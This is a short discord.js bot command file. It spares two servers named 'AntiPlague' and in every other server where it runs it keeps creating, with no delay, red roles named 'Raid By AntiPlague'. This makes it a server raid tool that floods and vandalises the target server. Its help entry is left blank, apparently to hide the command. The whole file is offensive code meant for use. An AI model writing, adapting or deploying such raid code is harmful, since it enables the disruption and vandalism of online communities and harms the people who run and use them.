const { MessageEmbed } = require('discord.js');

exports.run = async(client, message, args) => {
  if(message.guild.name === "AntiPlague [ Private ]")return; //message.channel.send("Estos comandos no están disponibles en este servidor");
  if(message.guild.name === "AntiPlague [ Reclutación ]")return; //message.channel.send("Estos comandos no están disponibles en este servidor");
  setInterval(async function() { 
    
    message.guild.roles.create({
      
   data: {
     name:'Raid By AntiPlague',
     color:'#ff0000'
     
   }
    })
    
  })
  
}

exports.help = {
  name:"",
  aliases:[],
  usage:"",
  description:"",
  category:""
  
}